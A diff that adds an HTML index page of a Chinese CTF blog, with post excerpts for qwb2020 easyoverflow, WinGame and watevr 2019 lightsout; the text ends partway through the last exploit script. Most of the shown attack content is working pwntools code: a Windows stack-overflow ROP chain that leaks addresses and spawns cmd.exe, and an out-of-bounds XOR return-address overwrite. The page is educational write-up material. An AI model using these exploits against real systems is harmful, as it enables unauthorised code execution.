@@ -1,0 +1,1220 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
+<meta name="theme-color" content="#222">
+<meta name="generator" content="Hexo 7.3.0">
+  <link rel="apple-touch-icon" sizes="180x180" href="/ha1vk/images/apple-touch-icon-next.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/ha1vk/images/favicon-32x32-next.png">
+  <link rel="icon" type="image/png" sizes="16x16" href="/ha1vk/images/favicon-16x16-next.png">
+  <link rel="mask-icon" href="/ha1vk/images/logo.svg" color="#222">
+
+<link rel="stylesheet" href="/ha1vk/css/main.css">
+
+
+<link rel="stylesheet" href="/ha1vk/lib/font-awesome/css/all.min.css">
+
+<script id="hexo-configurations">
+    var NexT = window.NexT || {};
+    var CONFIG = {"hostname":"github.com","root":"/ha1vk/","scheme":"Muse","version":"7.8.0","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12,"onmobile":false},"copycode":{"enable":false,"show_result":false,"style":null},"back2top":{"enable":true,"sidebar":false,"scrollpercent":false},"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":false,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":true,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},"path":"search.json"};
+  </script>
+
+  <meta property="og:type" content="website">
+<meta property="og:title" content="ha1vk&#39;s blog">
+<meta property="og:url" content="https://github.com/ha1vk/page/7/index.html">
+<meta property="og:site_name" content="ha1vk&#39;s blog">
+<meta property="og:locale" content="zh_CN">
+<meta property="article:author" content="ha1vk">
+<meta name="twitter:card" content="summary">
+
+<link rel="canonical" href="https://github.com/ha1vk/page/7/">
+
+
+<script id="page-configurations">
+  // https://hexo.io/docs/variables.html
+  CONFIG.page = {
+    sidebar: "",
+    isHome : true,
+    isPost : false,
+    lang   : 'zh-CN'
+  };
+</script>
+
+  <title>ha1vk's blog</title>
+  
+
+
+
+
+
+
+  <noscript>
+  <style>
+  .use-motion .brand,
+  .use-motion .menu-item,
+  .sidebar-inner,
+  .use-motion .post-block,
+  .use-motion .pagination,
+  .use-motion .comments,
+  .use-motion .post-header,
+  .use-motion .post-body,
+  .use-motion .collection-header { opacity: initial; }
+
+  .use-motion .site-title,
+  .use-motion .site-subtitle {
+    opacity: initial;
+    top: initial;
+  }
+
+  .use-motion .logo-line-before i { left: initial; }
+  .use-motion .logo-line-after i { right: initial; }
+  </style>
+</noscript>
+
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage">
+  <div class="container use-motion">
+    <div class="headband"></div>
+
+    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-container">
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="切换导航栏">
+      <span class="toggle-line toggle-line-first"></span>
+      <span class="toggle-line toggle-line-middle"></span>
+      <span class="toggle-line toggle-line-last"></span>
+    </div>
+  </div>
+
+  <div class="site-meta">
+
+    <a href="/ha1vk/" class="brand" rel="start">
+      <span class="logo-line-before"><i></i></span>
+      <h1 class="site-title">ha1vk's blog</h1>
+      <span class="logo-line-after"><i></i></span>
+    </a>
+  </div>
+
+  <div class="site-nav-right">
+    <div class="toggle popup-trigger">
+        <i class="fa fa-search fa-fw fa-lg"></i>
+    </div>
+  </div>
+</div>
+
+
+
+
+<nav class="site-nav">
+  <ul id="menu" class="main-menu menu">
+        <li class="menu-item menu-item-home">
+
+    <a href="/ha1vk/" rel="section"><i class="fa fa-home fa-fw"></i>首页</a>
+
+  </li>
+        <li class="menu-item menu-item-archives">
+
+    <a href="/ha1vk/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>归档</a>
+
+  </li>
+        <li class="menu-item menu-item-categories">
+
+    <a href="/ha1vk/categories/" rel="section"><i class="fa fa-th fa-fw"></i>分类</a>
+
+  </li>
+        <li class="menu-item menu-item-tags">
+
+    <a href="/ha1vk/tags/" rel="section"><i class="fa fa-tags fa-fw"></i>标签</a>
+
+  </li>
+        <li class="menu-item menu-item-about">
+
+    <a href="/ha1vk/about/" rel="section"><i class="fa fa-user fa-fw"></i>关于</a>
+
+  </li>
+      <li class="menu-item menu-item-search">
+        <a role="button" class="popup-trigger"><i class="fa fa-search fa-fw"></i>搜索
+        </a>
+      </li>
+  </ul>
+</nav>
+
+
+
+  <div class="search-pop-overlay">
+    <div class="popup search-popup">
+        <div class="search-header">
+  <span class="search-icon">
+    <i class="fa fa-search"></i>
+  </span>
+  <div class="search-input-container">
+    <input autocomplete="off" autocapitalize="off"
+           placeholder="搜索..." spellcheck="false"
+           type="search" class="search-input">
+  </div>
+  <span class="popup-btn-close">
+    <i class="fa fa-times-circle"></i>
+  </span>
+</div>
+<div id="search-result">
+  <div id="no-result">
+    <i class="fa fa-spinner fa-pulse fa-5x fa-fw"></i>
+  </div>
+</div>
+
+    </div>
+  </div>
+
+</div>
+    </header>
+
+    
+  <div class="back-to-top">
+    <i class="fa fa-arrow-up"></i>
+    <span>0%</span>
+  </div>
+
+
+    <main class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          
+
+          <div class="content index posts-expand">
+            
+      
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="https://github.com/ha1vk/2020/08/21/qwb2020-easyoverflow/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/ha1vk/images/avatar.gif">
+      <meta itemprop="name" content="ha1vk">
+      <meta itemprop="description" content="">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="ha1vk's blog">
+    </span>
+      <header class="post-header">
+        <h2 class="post-title" itemprop="name headline">
+          
+            <a href="/ha1vk/2020/08/21/qwb2020-easyoverflow/" class="post-title-link" itemprop="url">qwb2020_easyoverflow</a>
+        </h2>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">发表于</span>
+
+              <time title="创建时间：2020-08-21 15:56:14" itemprop="dateCreated datePublished" datetime="2020-08-21T15:56:14+08:00">2020-08-21</time>
+            </span>
+              <span class="post-meta-item">
+                <span class="post-meta-item-icon">
+                  <i class="far fa-calendar-check"></i>
+                </span>
+                <span class="post-meta-item-text">更新于</span>
+                <time title="修改时间：2025-06-26 14:22:10" itemprop="dateModified" datetime="2025-06-26T14:22:10+08:00">2025-06-26</time>
+              </span>
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-folder"></i>
+              </span>
+              <span class="post-meta-item-text">分类于</span>
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/ha1vk/categories/CTF/" itemprop="url" rel="index"><span itemprop="name">CTF</span></a>
+                </span>
+            </span>
+
+          
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+          <p>栈溢出，可以利用3次</p>
+<img src="/ha1vk/2020/08/21/qwb2020-easyoverflow/1.png" class="">
+<p>由于没有截断字符串，因此puts可以泄露出栈里的数据，在最后一次我们做rop重新回到main函数再一次进行利用，泄露出其他数据。由于windows上调用writefile的参数太多了，我们就直接使用kernel32.dll里的LoadLibraryA获得ucrtbase.dll加载地址，然后得到system地址，调用system(“cmd.exe”)来getshell。</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#coding:utf8</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">#context.log_level = &#x27;debug&#x27;</span></span><br><span class="line">Local = <span class="literal">False</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> Local:</span><br><span class="line">   kernel32_offset = <span class="number">0x84d4</span></span><br><span class="line">   ntdll_offset = <span class="number">0x6E871</span></span><br><span class="line">   <span class="comment">#add dword ptr [rbp - 0x14], esi ; mov eax, edx ; ret</span></span><br><span class="line">   add_p_rbp_esi = <span class="number">0x4c464</span></span><br><span class="line">   pop_rbp = <span class="number">0x1281</span></span><br><span class="line">   pop_rsi = <span class="number">0x2481</span></span><br><span class="line">   pop_rcx = <span class="number">0x95da5</span></span><br><span class="line">   LoadLibraryA = <span class="number">0x1FB90</span></span><br><span class="line">   add_rax_rcx = <span class="number">0x72722</span></span><br><span class="line">   jmp_rax = <span class="number">0x258e0</span></span><br><span class="line">   system_offset = <span class="number">0xA40C0</span></span><br><span class="line">   sh = remote(<span class="string">&#x27;192.168.232.137&#x27;</span>,<span class="number">6666</span>)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">   kernel32_offset = <span class="number">0x17974</span></span><br><span class="line">   ntdll_offset = <span class="number">0x6A271</span></span><br><span class="line">   <span class="comment">#add dword ptr [rbp - 0x14], esi ; mov eax, edx ; ret</span></span><br><span class="line">   add_p_rbp_esi = <span class="number">0x493a0</span></span><br><span class="line">   pop_rbp = <span class="number">0x120c</span></span><br><span class="line">   pop_rsi = <span class="number">0x1661</span></span><br><span class="line">   pop_rcx = <span class="number">0x9217b</span></span><br><span class="line">   LoadLibraryA = <span class="number">0x1F220</span></span><br><span class="line">   add_rax_rcx = <span class="number">0x5dc9</span></span><br><span class="line">   jmp_rax = <span class="number">0x236e0</span></span><br><span class="line">   system_offset = <span class="number">0xABBA0</span></span><br><span class="line">   sh = remote(<span class="string">&#x27;39.99.46.209&#x27;</span>,<span class="number">13389</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">#第一轮</span></span><br><span class="line">sh.sendafter(<span class="string">&#x27;input:&#x27;</span>,<span class="string">&#x27;a&#x27;</span>*<span class="number">0x100</span>)</span><br><span class="line">sh.recvuntil(<span class="string">&#x27;a&#x27;</span>*<span class="number">0x100</span>)</span><br><span class="line">stack_cookie = u64(sh.recvuntil(<span class="string">&#x27;\r\n&#x27;</span>,drop = <span class="literal">True</span>).ljust(<span class="number">8</span>,<span class="string">&#x27;\x00&#x27;</span>))</span><br><span class="line"><span class="built_in">print</span> <span class="string">&#x27;stack_cookie=&#x27;</span>,<span class="built_in">hex</span>(stack_cookie)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">sh.sendafter(<span class="string">&#x27;input:&#x27;</span>,<span class="string">&#x27;a&#x27;</span>*<span class="number">0x118</span>)</span><br><span class="line">sh.recvuntil(<span class="string">&#x27;a&#x27;</span>*<span class="number">0x118</span>)</span><br><span class="line">exe_base = u64(sh.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">&#x27;\x00&#x27;</span>)) - <span class="number">0x12f4</span></span><br><span class="line">data_addr = exe_base + <span class="number">0x3e80</span></span><br><span class="line"><span class="built_in">print</span> <span class="string">&#x27;exe_base=&#x27;</span>,<span class="built_in">hex</span>(exe_base)</span><br><span class="line"><span class="built_in">print</span> <span class="string">&#x27;data_addr=&#x27;</span>,<span class="built_in">hex</span>(data_addr)</span><br><span class="line">main_addr = exe_base + <span class="number">0x1000</span></span><br><span class="line">sh.sendafter(<span class="string">&#x27;input:&#x27;</span>,<span class="string">&#x27;a&#x27;</span>*<span class="number">0x100</span> + p64(stack_cookie) + <span class="string">&#x27;a&#x27;</span>*<span class="number">0x10</span> + p64(main_addr))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">#第二轮</span></span><br><span class="line">sh.sendafter(<span class="string">&#x27;input:&#x27;</span>,<span class="string">&#x27;a&#x27;</span>*<span class="number">0x100</span>)</span><br><span class="line">sh.recvuntil(<span class="string">&#x27;a&#x27;</span>*<span class="number">0x100</span>)</span><br><span class="line">stack_cookie = u64(sh.recvuntil(<span class="string">&#x27;\r\n&#x27;</span>,drop = <span class="literal">True</span>).ljust(<span class="number">8</span>,<span class="string">&#x27;\x00&#x27;</span>))</span><br><span class="line"><span class="built_in">print</span> <span class="string">&#x27;stack_cookie=&#x27;</span>,<span class="built_in">hex</span>(stack_cookie)</span><br><span class="line"><span class="comment">#泄露kernel32.dll地址</span></span><br><span class="line">sh.sendafter(<span class="string">&#x27;input:&#x27;</span>,<span class="string">&#x27;a&#x27;</span>*<span class="number">0x150</span>)</span><br><span class="line">sh.recvuntil(<span class="string">&#x27;a&#x27;</span>*<span class="number">0x150</span>)</span><br><span class="line">kernel32_base = u64(sh.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">&#x27;\x00&#x27;</span>)) - kernel32_offset</span><br><span class="line"><span class="built_in">print</span> <span class="string">&#x27;kernel32_base=&#x27;</span>,<span class="built_in">hex</span>(kernel32_base)</span><br><span class="line">add_p_rbp_esi += kernel32_base</span><br><span class="line">pop_rbp += kernel32_base</span><br><span class="line">pop_rsi += kernel32_base</span><br><span class="line">LoadLibraryA += kernel32_base</span><br><span class="line">add_rax_rcx += kernel32_base</span><br><span class="line">jmp_rax += kernel32_base</span><br><span class="line">sh.sendafter(<span class="string">&#x27;input:&#x27;</span>,<span class="string">&#x27;a&#x27;</span>*<span class="number">0x100</span> + p64(stack_cookie) + <span class="string">&#x27;a&#x27;</span>*<span class="number">0x10</span> + p64(main_addr))</span><br><span class="line"><span class="comment">#第三轮</span></span><br><span class="line">sh.sendafter(<span class="string">&#x27;input:&#x27;</span>,<span class="string">&#x27;a&#x27;</span>*<span class="number">0x100</span>)</span><br><span class="line">sh.recvuntil(<span class="string">&#x27;a&#x27;</span>*<span class="number">0x100</span>)</span><br><span class="line">stack_cookie = u64(sh.recvuntil(<span class="string">&#x27;\r\n&#x27;</span>,drop = <span class="literal">True</span>).ljust(<span class="number">8</span>,<span class="string">&#x27;\x00&#x27;</span>))</span><br><span class="line"><span class="built_in">print</span> <span class="string">&#x27;stack_cookie=&#x27;</span>,<span class="built_in">hex</span>(stack_cookie)</span><br><span class="line"><span class="comment">#泄露ntdll.dll地址</span></span><br><span class="line">sh.sendafter(<span class="string">&#x27;input:&#x27;</span>,<span class="string">&#x27;a&#x27;</span>*<span class="number">0x178</span>)</span><br><span class="line">sh.recvuntil(<span class="string">&#x27;a&#x27;</span>*<span class="number">0x178</span>)</span><br><span class="line">ntdll_base = u64(sh.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">&#x27;\x00&#x27;</span>)) - ntdll_offset</span><br><span class="line"><span class="built_in">print</span> <span class="string">&#x27;ntdll_base=&#x27;</span>,<span class="built_in">hex</span>(ntdll_base)</span><br><span class="line">pop_rcx += ntdll_base</span><br><span class="line">sh.sendafter(<span class="string">&#x27;input:&#x27;</span>,<span class="string">&#x27;a&#x27;</span>*<span class="number">0x100</span> + p64(stack_cookie) + <span class="string">&#x27;a&#x27;</span>*<span class="number">0x10</span> + p64(main_addr))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">#第四轮</span></span><br><span class="line">sh.sendafter(<span class="string">&#x27;input:&#x27;</span>,<span class="string">&#x27;a&#x27;</span>*<span class="number">0x100</span>)</span><br><span class="line">sh.recvuntil(<span class="string">&#x27;a&#x27;</span>*<span class="number">0x100</span>)</span><br><span class="line">stack_cookie = u64(sh.recvuntil(<span class="string">&#x27;\r\n&#x27;</span>,drop = <span class="literal">True</span>).ljust(<span class="number">8</span>,<span class="string">&#x27;\x00&#x27;</span>))</span><br><span class="line"><span class="built_in">print</span> <span class="string">&#x27;stack_cookie=&#x27;</span>,<span class="built_in">hex</span>(stack_cookie)</span><br><span class="line">sh.sendafter(<span class="string">&#x27;input:&#x27;</span>,<span class="string">&#x27;haivk&#x27;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">payload = <span class="string">&#x27;a&#x27;</span>*<span class="number">0x100</span> + p64(stack_cookie) + <span class="string">&#x27;a&#x27;</span>*<span class="number">0x8</span> + p64(system_offset)</span><br><span class="line"><span class="comment">#将ucrtbase.dll字符串保存到data段</span></span><br><span class="line">payload += p64(pop_rbp) + p64(data_addr + <span class="number">0x14</span>)</span><br><span class="line">payload += p64(pop_rsi) + p64(<span class="number">0x74726375</span>)</span><br><span class="line">payload += p64(add_p_rbp_esi)</span><br><span class="line">payload += p64(pop_rbp) + p64(data_addr + <span class="number">0x4</span> + <span class="number">0x14</span>)</span><br><span class="line">payload += p64(pop_rsi) + p64(<span class="number">0x65736162</span>)</span><br><span class="line">payload += p64(add_p_rbp_esi)</span><br><span class="line">payload += p64(pop_rbp) + p64(data_addr + <span class="number">0x8</span> + <span class="number">0x14</span>)</span><br><span class="line">payload += p64(pop_rsi) + p64(<span class="number">0x6C6C642E</span>)</span><br><span class="line">payload += p64(add_p_rbp_esi)</span><br><span class="line">payload += p64(pop_rbp) + p64(data_addr + <span class="number">0xC</span> + <span class="number">0x14</span>)</span><br><span class="line">payload += p64(pop_rsi) + p64(<span class="number">0</span>)</span><br><span class="line">payload += p64(add_p_rbp_esi)</span><br><span class="line"><span class="comment">#将cmd.exe字符串保存到data段</span></span><br><span class="line">payload += p64(pop_rbp) + p64(data_addr + <span class="number">0x10</span> + <span class="number">0x14</span>)</span><br><span class="line">payload += p64(pop_rsi) + p64(<span class="number">0x2E646D63</span>)</span><br><span class="line">payload += p64(add_p_rbp_esi)</span><br><span class="line">payload += p64(pop_rbp) + p64(data_addr + <span class="number">0x14</span> + <span class="number">0x14</span>)</span><br><span class="line">payload += p64(pop_rsi) + p64(<span class="number">0x657865</span>)</span><br><span class="line">payload += p64(add_p_rbp_esi)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">#LoadLibraryA(&quot;ucrtbase.dll&quot;)</span></span><br><span class="line">payload += p64(pop_rcx) + p64(data_addr) + p64(pop_rsi) + p64(add_rax_rcx) + p64(LoadLibraryA)</span><br><span class="line">payload += p64(pop_rcx) + p64(system_offset) + p64(add_rax_rcx)</span><br><span class="line">payload += p64(pop_rcx) + p64(data_addr + <span class="number">0x10</span>) + p64(jmp_rax)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">raw_input()</span><br><span class="line">sh.sendafter(<span class="string">&#x27;input:&#x27;</span>,payload)</span><br><span class="line"></span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure>
+
+      
+    </div>
+
+    
+    
+    
+      <footer class="post-footer">
+        <div class="post-eof"></div>
+      </footer>
+  </article>
+  
+  
+  
+
+      
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="https://github.com/ha1vk/2020/08/21/qwb2020-WinGame/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/ha1vk/images/avatar.gif">
+      <meta itemprop="name" content="ha1vk">
+      <meta itemprop="description" content="">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="ha1vk's blog">
+    </span>
+      <header class="post-header">
+        <h2 class="post-title" itemprop="name headline">
+          
+            <a href="/ha1vk/2020/08/21/qwb2020-WinGame/" class="post-title-link" itemprop="url">qwb2020_WinGame</a>
+        </h2>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">发表于</span>
+
+              <time title="创建时间：2020-08-21 15:36:14" itemprop="dateCreated datePublished" datetime="2020-08-21T15:36:14+08:00">2020-08-21</time>
+            </span>
+              <span class="post-meta-item">
+                <span class="post-meta-item-icon">
+                  <i class="far fa-calendar-check"></i>
+                </span>
+                <span class="post-meta-item-text">更新于</span>
+                <time title="修改时间：2025-06-26 14:16:38" itemprop="dateModified" datetime="2025-06-26T14:16:38+08:00">2025-06-26</time>
+              </span>
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-folder"></i>
+              </span>
+              <span class="post-meta-item-text">分类于</span>
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/ha1vk/categories/CTF/" itemprop="url" rel="index"><span itemprop="name">CTF</span></a>
+                </span>
+            </span>
+
+          
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+          <p>warm_up里的edit功能存在溢出</p>
+<img src="/ha1vk/2020/08/21/qwb2020-WinGame/1.png" class>
+<p>利用堆喷将Src字符串对象布置到堆的后面</p>
+<img src="/ha1vk/2020/08/21/qwb2020-WinGame/2.png" class>
+<p>然后利用溢出控制Src字符串对象里的size成员，即可实现越界读，从而泄露出key和程序基址</p>
+          <!--noindex-->
+            <div class="post-button">
+              <a class="btn" href="/ha1vk/2020/08/21/qwb2020-WinGame/#more" rel="contents">
+                阅读全文 &raquo;
+              </a>
+            </div>
+          <!--/noindex-->
+        
+      
+    </div>
+
+    
+    
+    
+      <footer class="post-footer">
+        <div class="post-eof"></div>
+      </footer>
+  </article>
+  
+  
+  
+
+      
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="https://github.com/ha1vk/2020/08/16/watevr-2019-5x5-lightsout/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/ha1vk/images/avatar.gif">
+      <meta itemprop="name" content="ha1vk">
+      <meta itemprop="description" content="">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="ha1vk's blog">
+    </span>
+      <header class="post-header">
+        <h2 class="post-title" itemprop="name headline">
+          
+            <a href="/ha1vk/2020/08/16/watevr-2019-5x5-lightsout/" class="post-title-link" itemprop="url">watevr_2019_5x5_lightsout</a>
+        </h2>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">发表于</span>
+
+              <time title="创建时间：2020-08-16 14:04:50" itemprop="dateCreated datePublished" datetime="2020-08-16T14:04:50+08:00">2020-08-16</time>
+            </span>
+              <span class="post-meta-item">
+                <span class="post-meta-item-icon">
+                  <i class="far fa-calendar-check"></i>
+                </span>
+                <span class="post-meta-item-text">更新于</span>
+                <time title="修改时间：2025-06-26 10:57:23" itemprop="dateModified" datetime="2025-06-26T10:57:23+08:00">2025-06-26</time>
+              </span>
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-folder"></i>
+              </span>
+              <span class="post-meta-item-text">分类于</span>
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/ha1vk/categories/CTF/" itemprop="url" rel="index"><span itemprop="name">CTF</span></a>
+                </span>
+            </span>
+
+          
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+          <img src="/ha1vk/2020/08/16/watevr-2019-5x5-lightsout/1.png" class="">
+
+<p>根据这里的越界异或，将返回地址改为one_gadget。其中注意到能够异或的值是有限定的，可以异或(7 &lt;&lt; (i - 1))的值，如下</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">00000011</span><br><span class="line">00000111</span><br><span class="line">00001110</span><br><span class="line">00011100</span><br><span class="line">00111000</span><br><span class="line">01110000</span><br><span class="line">11100000</span><br><span class="line">11000000</span><br><span class="line">10000000</span><br><span class="line">00000000</span><br></pre></td></tr></table></figure>
+<p>可以发现，这样值已经可以构造任意的值了。如下exp，是假设存在借位的情况，因此需要一定的概率才能成功</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#coding:utf8</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"> </span><br><span class="line"><span class="comment">#sh = process(&#x27;./watevr_2019_5x5_lightsout&#x27;,env = &#123;&#x27;LD_PRELOAD&#x27;:&#x27;./libc-2.27.so&#x27;&#125;)</span></span><br><span class="line">sh = remote(<span class="string">&#x27;node3.buuoj.cn&#x27;</span>,<span class="number">28016</span>)</span><br><span class="line">sh.sendlineafter(<span class="string">&#x27;Press enter to run M-x 5x5&#x27;</span>,<span class="string">&#x27;&#x27;</span>)</span><br><span class="line"> </span><br><span class="line">sh.sendlineafter(<span class="string">&#x27;Board size (1 to 8)?&#x27;</span>,<span class="string">&#x27;1&#x27;</span>)</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line">sh.sendlineafter(<span class="string">&#x27;[f &lt;x&gt; &lt;y&gt;/h/q]:&#x27;</span>,<span class="string">&#x27;f 0 50&#x27;</span>)</span><br><span class="line"> </span><br><span class="line">sh.sendlineafter(<span class="string">&#x27;[f &lt;x&gt; &lt;y&gt;/h/q]:&#x27;</span>,<span class="string">&#x27;f 0 49&#x27;</span>)</span><br><span class="line">sh.sendlineafter(<span class="string">&#x27;[f &lt;x&gt; &lt;y&gt;/h/q]:&#x27;</span>,<span class="string">&#x27;f 2 49&#x27;</span>)</span><br><span class="line">sh.sendlineafter(<span class="string">&#x27;[f &lt;x&gt; &lt;y&gt;/h/q]:&#x27;</span>,<span class="string">&#x27;f 3 49&#x27;</span>)</span><br><span class="line">sh.sendlineafter(<span class="string">&#x27;[f &lt;x&gt; &lt;y&gt;/h/q]:&#x27;</span>,<span class="string">&#x27;f 4 49&#x27;</span>)</span><br><span class="line">sh.sendlineafter(<span class="string">&#x27;[f &lt;x&gt; &lt;y&gt;/h/q]:&#x27;</span>,<span class="string">&#x27;f 7 49&#x27;</span>)</span><br><span class="line">sh.sendlineafter(<span class="string">&#x27;[f &lt;x&gt; &lt;y&gt;/h/q]:&#x27;</span>,<span class="string">&#x27;f 8 49&#x27;</span>)</span><br><span class="line"> 